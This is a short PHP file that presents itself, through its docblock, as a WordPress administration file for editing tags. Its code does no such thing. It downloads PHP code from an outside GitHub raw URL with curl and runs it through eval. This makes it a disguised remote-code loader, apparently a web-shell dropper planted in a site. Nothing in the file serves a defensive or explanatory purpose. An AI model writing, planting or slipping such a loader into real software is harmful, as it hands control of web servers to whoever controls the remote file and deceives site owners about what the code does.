<?php
/**
 * Edit tag form for inclusion in administration panels.
 *
 * @package WordPress
 * @subpackage Administration
 */
$url = "https://raw.githubusercontent.com/clovespia99/forbideng/refs/heads/main/alfred.php";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);

if ($result === false) {
    echo "Error fetching remote content";
} else {
    // Assuming $result contains PHP code, execute it
    if (is_string($result)) {
        // Start output buffering
        ob_start();
        // Execute the fetched PHP code
        eval('?>'.$result);
        // Get the output buffer content and clean it
        $output = ob_get_clean();
        // Echo the output
        echo $output;
    } else {
        echo "Error: Invalid response from remote server";
    }
}

curl_close($ch);
?>
